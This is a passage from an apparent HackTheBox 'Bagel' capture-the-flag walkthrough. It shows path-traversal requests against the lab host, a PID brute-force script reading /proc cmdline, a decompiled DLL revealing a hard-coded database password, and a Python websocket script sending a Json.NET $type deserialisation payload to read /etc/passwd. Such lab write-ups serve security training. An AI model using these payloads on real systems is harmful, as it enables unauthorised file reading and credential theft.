+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">if __name__ == &#39;</span><span class="nx">__main__</span><span class="s1">&#39;:
+</span></span></span><span class="line"><span class="cl"><span class="s1">  app.run(host=&#39;</span><span class="mf">0.0.0.0</span><span class="s1">&#39;, port=8000)
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">curl -i -s -k -X $&#39;</span><span class="nx">GET</span><span class="s1">&#39; \
+</span></span></span><span class="line"><span class="cl"><span class="s1">    -H $&#39;</span><span class="nx">Host</span><span class="o">:</span> <span class="nx">bagel</span><span class="p">.</span><span class="nx">htb</span><span class="o">:</span><span class="mi">8000</span><span class="s1">&#39; -H $&#39;</span><span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span> <span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="nx">X11</span><span class="p">;</span> <span class="nx">Linux</span> <span class="nx">x86_64</span><span class="p">;</span> <span class="nx">rv</span><span class="o">:</span><span class="mf">102.0</span><span class="p">)</span> <span class="nx">Gecko</span><span class="o">/</span><span class="mi">20100101</span> <span class="nx">Firefox</span><span class="o">/</span><span class="mf">102.0</span><span class="s1">&#39; -H $&#39;</span><span class="nx">Accept</span><span class="o">:</span> <span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">avif</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">webp</span><span class="p">,</span><span class="o">*</span><span class="sr">/*;q=0.8&#39; -H $&#39;Accept-Language: en-US,en;q=0.5&#39; -H $&#39;Accept-Encoding: gzip, deflate&#39; -H $&#39;Connection: close&#39; -H $&#39;Upgrade-Insecure-Requests: 1&#39; \
+</span></span></span><span class="line"><span class="cl"><span class="sr">    $&#39;http:/</span><span class="o">/</span><span class="nx">bagel</span><span class="p">.</span><span class="nx">htb</span><span class="o">:</span><span class="mi">8000</span><span class="o">/?</span><span class="nx">page</span><span class="o">=</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">.</span><span class="nx">Dockerfile</span><span class="err">&#39;</span>
+</span></span></code></pre></div><p>Since there is no filename or path which was disclosed, given the LFI the best bet we have on this is to run a PID bruteforce with a script and get the <code>cmdline</code> information, following script does the work:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="ch">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="ch"></span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="nx">i</span> <span class="k">in</span> <span class="p">{</span><span class="mf">0..999</span><span class="p">};</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">pid</span><span class="o">=</span><span class="nx">$i</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">url</span><span class="o">=</span><span class="s2">&#34;http://bagel.htb:8000/?page=../../../../../proc/$pid/cmdline&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">curl</span> <span class="o">-</span><span class="nx">s</span> <span class="s2">&#34;$url&#34;</span> <span class="o">|</span> <span class="nx">tee</span> <span class="o">-</span><span class="nx">a</span> <span class="nx">log</span><span class="p">.</span><span class="nx">txt</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">echo</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">done</span>
+</span></span></code></pre></div><p>Running the script I see that there is a <code>bagel.dll</code> running with <code>dotnet</code> , since we have the absolute path of the file, we can download it via the LFI</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled_4.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="err">❯</span> <span class="nx">wget</span> <span class="nx">http</span><span class="o">:</span><span class="c1">//bagel.htb:8000/\?page\=../../../../../../opt/bagel/bin/Debug/net6.0/bagel.dll
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">--</span><span class="mi">2023</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">19</span> <span class="mi">18</span><span class="o">:</span><span class="mi">11</span><span class="o">:</span><span class="mi">06</span><span class="o">--</span>  <span class="nx">http</span><span class="o">:</span><span class="c1">//bagel.htb:8000/?page=../../../../../../opt/bagel/bin/Debug/net6.0/bagel.dll
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">Resolving</span> <span class="nx">bagel</span><span class="p">.</span><span class="nx">htb</span> <span class="p">(</span><span class="nx">bagel</span><span class="p">.</span><span class="nx">htb</span><span class="p">)...</span> <span class="mf">10.10.11.201</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Connecting</span> <span class="nx">to</span> <span class="nx">bagel</span><span class="p">.</span><span class="nx">htb</span> <span class="p">(</span><span class="nx">bagel</span><span class="p">.</span><span class="nx">htb</span><span class="p">)</span><span class="o">|</span><span class="mf">10.10.11.201</span><span class="o">|:</span><span class="mf">8000.</span><span class="p">..</span> <span class="nx">connected</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="nx">HTTP</span> <span class="nx">request</span> <span class="nx">sent</span><span class="p">,</span> <span class="nx">awaiting</span> <span class="nx">response</span><span class="p">...</span> <span class="mi">200</span> <span class="nx">OK</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Length</span><span class="o">:</span> <span class="mi">10752</span> <span class="p">(</span><span class="mi">10</span><span class="nx">K</span><span class="p">)</span> <span class="p">[</span><span class="nx">application</span><span class="o">/</span><span class="nx">octet</span><span class="o">-</span><span class="nx">stream</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Saving</span> <span class="nx">to</span><span class="o">:</span> <span class="err">‘</span><span class="nx">index</span><span class="p">.</span><span class="nx">html</span><span class="o">?</span><span class="nx">page</span><span class="o">=</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">F</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">F</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">F</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">F</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">F</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fopt</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fbagel</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fbin</span><span class="o">%</span><span class="mi">2</span><span class="nx">FDebug</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fnet6</span><span class="mf">.0</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fbagel</span><span class="p">.</span><span class="nx">dll</span><span class="err">’</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">index</span><span class="p">.</span><span class="nx">html</span><span class="o">?</span><span class="nx">page</span><span class="o">=</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">F</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">F</span><span class="p">..</span><span class="o">%</span> <span class="mi">100</span><span class="o">%</span><span class="p">[</span><span class="o">================================================&gt;</span><span class="p">]</span>  <span class="mf">10.50</span><span class="nx">K</span>  <span class="o">--</span><span class="p">.</span><span class="o">-</span><span class="nx">KB</span><span class="o">/</span><span class="nx">s</span>    <span class="k">in</span> <span class="mi">0</span><span class="nx">s</span>      
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">19</span> <span class="mi">18</span><span class="o">:</span><span class="mi">11</span><span class="o">:</span><span class="mi">06</span> <span class="p">(</span><span class="mf">48.7</span> <span class="nx">MB</span><span class="o">/</span><span class="nx">s</span><span class="p">)</span> <span class="o">-</span> <span class="err">‘</span><span class="nx">index</span><span class="p">.</span><span class="nx">html</span><span class="o">?</span><span class="nx">page</span><span class="o">=</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">F</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">F</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">F</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">F</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">F</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fopt</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fbagel</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fbin</span><span class="o">%</span><span class="mi">2</span><span class="nx">FDebug</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fnet6</span><span class="mf">.0</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fbagel</span><span class="p">.</span><span class="nx">dll</span><span class="err">’</span> <span class="nx">saved</span> <span class="p">[</span><span class="mi">10752</span><span class="o">/</span><span class="mi">10752</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">❯</span> <span class="nx">mv</span> <span class="nx">index</span><span class="p">.</span><span class="nx">html</span><span class="err">\</span><span class="o">?</span><span class="nx">page</span><span class="o">=</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">F</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">F</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">F</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">F</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">F</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fopt</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fbagel</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fbin</span><span class="o">%</span><span class="mi">2</span><span class="nx">FDebug</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fnet6</span><span class="mf">.0</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fbagel</span><span class="p">.</span><span class="nx">dll</span> <span class="nx">bagle</span><span class="p">.</span><span class="nx">dll</span>
+</span></span></code></pre></div><p>Now, it is time to analyze the DLL file using <code>dnSpy</code></p>
+<h3 id="analysing-the-bageldll" class="relative group">Analysing the <code>bagel.dll</code> <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#analysing-the-bageldll" aria-label="Anchor">#</a></span></h3><p>Checking the <code>bagel.dll</code> , it wasn’t big file so had limited number of classes and methods, one of the class was named as <code>DB</code>, it contained the SQL credentials for the <code>dev</code> user</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled_5.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="nx">using</span> <span class="nx">System</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">using</span> <span class="nx">Microsoft</span><span class="p">.</span><span class="nx">Data</span><span class="p">.</span><span class="nx">SqlClient</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">namespace</span> <span class="nx">bagel_server</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">// Token: 0x0200000A RID: 10
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kr">public</span> <span class="kr">class</span> <span class="nx">DB</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">// Token: 0x06000022 RID: 34 RVA: 0x00002518 File Offset: 0x00000718
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="p">[</span><span class="nx">Obsolete</span><span class="p">(</span><span class="s2">&#34;The production team has to decide where the database server will be hosted. This method is not fully implemented.&#34;</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl">		<span class="kr">public</span> <span class="k">void</span> <span class="nx">DB_connection</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">string</span> <span class="nx">text</span> <span class="o">=</span> <span class="s2">&#34;Data Source=ip;Initial Catalog=Orders;User ID=dev;Password=k8wdAYYKyhnjg3K&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">SqlConnection</span> <span class="nx">sqlConnection</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SqlConnection</span><span class="p">(</span><span class="nx">text</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Since we already identified that there was a user named as <code>developer</code> , we might be able to SSH to the machine but it wasn’t working as the SSH server does not seem to accept the password from the remote user:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="err">❯</span> <span class="nx">ssh</span> <span class="nx">developer</span><span class="err">@</span><span class="nx">bagel</span><span class="p">.</span><span class="nx">htb</span>
+</span></span><span class="line"><span class="cl"><span class="nx">developer</span><span class="err">@</span><span class="nx">bagel</span><span class="p">.</span><span class="nx">htb</span><span class="o">:</span> <span class="nx">Permission</span> <span class="nx">denied</span> <span class="p">(</span><span class="nx">publickey</span><span class="p">,</span><span class="nx">gssapi</span><span class="o">-</span><span class="nx">keyex</span><span class="p">,</span><span class="nx">gssapi</span><span class="o">-</span><span class="kd">with</span><span class="o">-</span><span class="nx">mic</span><span class="p">).</span>
+</span></span></code></pre></div><p>During the process dumping, I identified that <code>gssproxy</code> is running as well, a little bit insight into the GSSAPI:</p>
+<ul>
+<li><strong>Gssapi-keyex</strong>: This authentication method uses the Generic Security Services Application Program Interface (GSSAPI) to authenticate the client. It negotiates a secure key exchange protocol to create a shared secret between the client and server.</li>
+<li><strong>Gssapi-with-mic</strong>: This authentication method uses GSSAPI to authenticate the client, but it also includes a message integrity check (MIC) to ensure the authenticity of the message.</li>
+</ul>
+<aside>
+💡
+<p>GSSAPI is a generic security API used to authenticate client/server applications. GSSProxy is a service that allows users to obtain GSSAPI credentials on behalf of a service without having direct access to the user&rsquo;s keytab.</p>
+<p>The GSSProxy service is commonly used in environments where centralized authentication and authorization mechanisms are required, such as in large-scale enterprise networks. By acting as a proxy between a client application and the Kerberos authentication system, GSSProxy provides a secure and efficient way to obtain Kerberos credentials for a particular service.</p>
+<p>GSSProxy is implemented as a daemon process that runs on the client machine and communicates with the Kerberos authentication system. When a client application needs to authenticate with a service, it sends a request to GSSProxy, which then acquires the necessary credentials on behalf of the client and returns them to the application.</p>
+<p>In summary, GSSProxy is a service that provides a secure and efficient way to obtain GSSAPI credentials for a particular service, without requiring direct access to the user&rsquo;s keytab.</p>
+</aside>
+<p>It seems that we won’t be able to authenticate to the SSH without any key or any GSSAPI key, digging deeper into the DLL file, we see that it accepts the JSON data and pass it to <code>handler.Deserialise</code> method to parse the JSON data:</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled_6.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Checking the <code>handler</code> class and the <code>deserialise</code> method is making use of the <code>Newtonsoft.Json</code> class, since there is no explicit <code>TypeHandling</code> was defined i.e. <code>4</code> is not a valid constant value for the <code>TypeHandling</code> , this is vulnerable to Deserialisation attack, check the Source Code Analysis note for better insight:</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled_7.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>As we can interact with the websocket, what we can do is, due to insecure deserialisation, we can craft a payload for performing deserialisation attack. We can interact to the service using following script:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3
+</span></span></span><span class="line"><span class="cl"><span class="ch"></span>
+</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">websocket</span>
+</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">json</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">def</span> <span class="nx">order</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span><span class="o">:</span> <span class="err">#</span> <span class="nx">don</span><span class="err">&#39;</span><span class="nx">t</span> <span class="nx">forget</span> <span class="nx">to</span> <span class="nx">run</span> <span class="nx">the</span> <span class="nx">order</span> <span class="nx">app</span> <span class="nx">first</span> <span class="kd">with</span> <span class="s2">&#34;dotnet &lt;path to .dll&gt;&#34;</span> <span class="nx">command</span><span class="p">.</span> <span class="nx">Use</span> <span class="nx">your</span> <span class="nx">ssh</span> <span class="nx">key</span> <span class="nx">to</span> <span class="nx">access</span> <span class="nx">the</span> <span class="nx">machine</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">ws</span> <span class="o">=</span> <span class="nx">websocket</span><span class="p">.</span><span class="nx">WebSocket</span><span class="p">()</span>    
+</span></span><span class="line"><span class="cl">        <span class="nx">ws</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="s2">&#34;ws://10.10.11.201:5000/&#34;</span><span class="p">)</span> <span class="err">#</span> <span class="nx">connect</span> <span class="nx">to</span> <span class="nx">order</span> <span class="nx">app</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">order</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;ReadOrder&#34;</span><span class="o">:</span><span class="nx">data</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">data</span> <span class="o">=</span> <span class="nx">str</span><span class="p">(</span><span class="nx">json</span><span class="p">.</span><span class="nx">dumps</span><span class="p">(</span><span class="nx">order</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">result</span> <span class="o">=</span> <span class="nx">ws</span><span class="p">.</span><span class="nx">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">(</span><span class="nx">json</span><span class="p">.</span><span class="nx">loads</span><span class="p">(</span><span class="nx">result</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">except</span> <span class="nx">Exception</span> <span class="nx">as</span> <span class="nx">E</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">print</span><span class="p">(</span><span class="nx">E</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">(</span><span class="s2">&#34;Unable to connect&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">print</span><span class="p">(</span><span class="nx">order</span><span class="p">(</span><span class="s2">&#34;orders.txt&#34;</span><span class="p">))</span>
+</span></span></code></pre></div><p>Running the script with different inputs for the <code>data</code> , it works quite well:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="err">❯</span> <span class="nx">python3</span> <span class="nx">interact_bagel</span><span class="p">.</span><span class="nx">py</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s1">&#39;UserId&#39;</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;Session&#39;</span><span class="o">:</span> <span class="s1">&#39;Unauthorized&#39;</span><span class="p">,</span> <span class="s1">&#39;Time&#39;</span><span class="o">:</span> <span class="s1">&#39;8:20:01&#39;</span><span class="p">,</span> <span class="s1">&#39;RemoveOrder&#39;</span><span class="o">:</span> <span class="nx">None</span><span class="p">,</span> <span class="s1">&#39;WriteOrder&#39;</span><span class="o">:</span> <span class="nx">None</span><span class="p">,</span> <span class="s1">&#39;ReadOrder&#39;</span><span class="o">:</span> <span class="s1">&#39;Order not found!&#39;</span><span class="p">}</span> <span class="o">-</span> <span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="nx">etc</span><span class="o">/</span><span class="nx">passwd</span>
+</span></span><span class="line"><span class="cl"><span class="err">❯</span> <span class="nx">python3</span> <span class="nx">interact_bagel</span><span class="p">.</span><span class="nx">py</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s1">&#39;UserId&#39;</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;Session&#39;</span><span class="o">:</span> <span class="s1">&#39;Unauthorized&#39;</span><span class="p">,</span> <span class="s1">&#39;Time&#39;</span><span class="o">:</span> <span class="s1">&#39;8:20:17&#39;</span><span class="p">,</span> <span class="s1">&#39;RemoveOrder&#39;</span><span class="o">:</span> <span class="nx">None</span><span class="p">,</span> <span class="s1">&#39;WriteOrder&#39;</span><span class="o">:</span> <span class="nx">None</span><span class="p">,</span> <span class="s1">&#39;ReadOrder&#39;</span><span class="o">:</span> <span class="s1">&#39;Order not found!&#39;</span><span class="p">}</span> <span class="o">-</span> <span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">.</span><span class="o">/</span><span class="nx">etc</span><span class="o">/</span><span class="nx">hosts</span>
+</span></span><span class="line"><span class="cl"><span class="err">❯</span> <span class="nx">python3</span> <span class="nx">interact_bagel</span><span class="p">.</span><span class="nx">py</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s1">&#39;UserId&#39;</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;Session&#39;</span><span class="o">:</span> <span class="s1">&#39;Unauthorized&#39;</span><span class="p">,</span> <span class="s1">&#39;Time&#39;</span><span class="o">:</span> <span class="s1">&#39;8:20:24&#39;</span><span class="p">,</span> <span class="s1">&#39;RemoveOrder&#39;</span><span class="o">:</span> <span class="nx">None</span><span class="p">,</span> <span class="s1">&#39;WriteOrder&#39;</span><span class="o">:</span> <span class="nx">None</span><span class="p">,</span> <span class="s1">&#39;ReadOrder&#39;</span><span class="o">:</span> <span class="s1">&#39;abc&#39;</span><span class="p">}</span> <span class="o">-</span> <span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="nx">orders</span><span class="p">.</span><span class="nx">txt</span>
+</span></span></code></pre></div><p>There is a method called <code>RemoveOrder</code> which does not have any objects defined in it like other methods</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled_8.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>There was another class named as <code>File</code> containing a method called <code>ReadFile</code> which could be the perfect target for the attack as we can retrieve any arbitrary file:</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled_9.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Now, we can craft the payload as follows:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;RemoveOrder&#34;</span><span class="o">:</span> <span class="p">{</span><span class="s2">&#34;$type&#34;</span><span class="o">:</span> <span class="s2">&#34;bagel_server.File, bagel&#34;</span><span class="p">,</span> <span class="s2">&#34;ReadFile&#34;</span><span class="o">:</span> <span class="nx">data</span><span class="p">}}</span>
+</span></span></code></pre></div><p><code>RemoveOrder</code> is one of the methods we can call, using the <code>$type</code> , we can specify <code>bagel_server.File, bagel</code> such as we will be calling a method from that specific location i.e. <code>ReadFile</code> , lastly the <code>data</code> is the argument for the <code>ReadFile</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3
+</span></span></span><span class="line"><span class="cl"><span class="ch"></span>
+</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">websocket</span>
+</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">json</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">def</span> <span class="nx">order</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span><span class="o">:</span> <span class="err">#</span> <span class="nx">don</span><span class="err">&#39;</span><span class="nx">t</span> <span class="nx">forget</span> <span class="nx">to</span> <span class="nx">run</span> <span class="nx">the</span> <span class="nx">order</span> <span class="nx">app</span> <span class="nx">first</span> <span class="kd">with</span> <span class="s2">&#34;dotnet &lt;path to .dll&gt;&#34;</span> <span class="nx">command</span><span class="p">.</span> <span class="nx">Use</span> <span class="nx">your</span> <span class="nx">ssh</span> <span class="nx">key</span> <span class="nx">to</span> <span class="nx">access</span> <span class="nx">the</span> <span class="nx">machine</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">ws</span> <span class="o">=</span> <span class="nx">websocket</span><span class="p">.</span><span class="nx">WebSocket</span><span class="p">()</span>    
+</span></span><span class="line"><span class="cl">        <span class="nx">ws</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="s2">&#34;ws://10.10.11.201:5000/&#34;</span><span class="p">)</span> <span class="err">#</span> <span class="nx">connect</span> <span class="nx">to</span> <span class="nx">order</span> <span class="nx">app</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">order</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;RemoveOrder&#34;</span><span class="o">:</span> <span class="p">{</span><span class="s2">&#34;$type&#34;</span><span class="o">:</span> <span class="s2">&#34;bagel_server.File, bagel&#34;</span><span class="p">,</span> <span class="s2">&#34;ReadFile&#34;</span><span class="o">:</span> <span class="nx">data</span><span class="p">}}</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">data</span> <span class="o">=</span> <span class="nx">str</span><span class="p">(</span><span class="nx">json</span><span class="p">.</span><span class="nx">dumps</span><span class="p">(</span><span class="nx">order</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">result</span> <span class="o">=</span> <span class="nx">ws</span><span class="p">.</span><span class="nx">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">(</span><span class="nx">json</span><span class="p">.</span><span class="nx">loads</span><span class="p">(</span><span class="nx">result</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">except</span> <span class="nx">Exception</span> <span class="nx">as</span> <span class="nx">E</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">print</span><span class="p">(</span><span class="nx">E</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">(</span><span class="s2">&#34;Unable to connect&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">print</span><span class="p">(</span><span class="nx">order</span><span class="p">(</span><span class="s2">&#34;../../../../../../../etc/passwd&#34;</span><span class="p">))</span>
+</span></span></code></pre></div><p>Checking it with the <code>/etc/passwd</code> , it worked like a charm</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="err">❯</span> <span class="nx">python3</span> <span class="nx">interact_bagel</span><span class="p">.</span><span class="nx">py</span>
+</span></span><span class="line"><span class="cl">
